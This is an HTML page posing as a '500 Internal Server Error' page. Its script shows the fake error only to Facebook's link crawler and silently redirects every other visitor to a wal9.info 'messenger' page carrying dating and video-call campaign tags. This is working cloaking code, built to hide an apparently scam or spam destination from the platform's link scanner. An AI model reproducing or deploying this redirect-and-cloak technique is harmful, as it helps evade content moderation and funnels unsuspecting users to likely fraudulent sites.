<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-YETGZHL73D"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-YETGZHL73D');
    </script>
    <script>
        window.onload = function() {
            // Check the user agent
            const userAgent = navigator.userAgent;

            // Simulate checking for Facebook's crawler
            if (userAgent.includes('facebookexternalhit')) {
                // Simulate sending a 500 error response
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; // Stop further execution
            }

            // Otherwise, redirect to a random page
            const pages = [
                "https://wal9.info/messenger/index.php?utm_source=facebook&utm_medium=banner&utm_campaign=faceook_messenger&utm_id=facebook&utm_term=video_calls&utm_content=dating",
                "https://wal9.info/messenger/?utm_source=facebook&utm_medium=cpc&utm_campaign=faceook_messenger&utm_id=facebook&utm_term=video_calls&utm_content=dating"
            ];
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
    </script>
</head>
<body>
</body>
</html>
